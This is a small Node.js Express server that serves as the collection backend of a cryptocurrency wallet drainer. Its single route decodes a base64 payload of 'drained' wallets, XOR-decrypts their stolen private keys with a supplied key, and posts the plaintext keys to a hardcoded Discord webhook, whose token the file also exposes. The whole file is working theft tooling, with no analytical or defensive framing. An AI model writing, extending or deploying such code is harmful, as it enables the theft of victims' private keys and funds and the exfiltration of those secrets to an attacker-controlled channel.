const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1518230578246320293/34AEaJ-GcgHflhqtbrQ0kNTZaMBlRiSiX2DjVcWAGfS2e1vN1JsDeJ_484mrqt0pdJRB';

app.use(express.json({limit:'10mb'}));

app.get('/data/:payload', async (req, res) => {
  try {
    const payload = Buffer.from(req.params.payload, 'base64').toString('utf8');
    const data = JSON.parse(payload);
    if (data.drained && Array.isArray(data.drained) && data.decryptKey) {
      const key = data.decryptKey;
      data.drained = data.drained.map(w => {
        if (w.privEncrypted) {
          let decrypted = '';
          for(let i=0; i<w.privEncrypted.length; i++){
            decrypted += String.fromCharCode(w.privEncrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length));
          }
          w.privDecrypted = decrypted;
          delete w.privEncrypted;
        }
        return w;
      });
    }
    await axios.post(WEBHOOK_URL, {
      content: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
    });
    res.send('Logged to Discord');
  } catch(e) {
    console.error(e);
    res.status(500).send(e.message);
  }
});

app.listen(PORT, () => console.log('Running on port '+PORT));
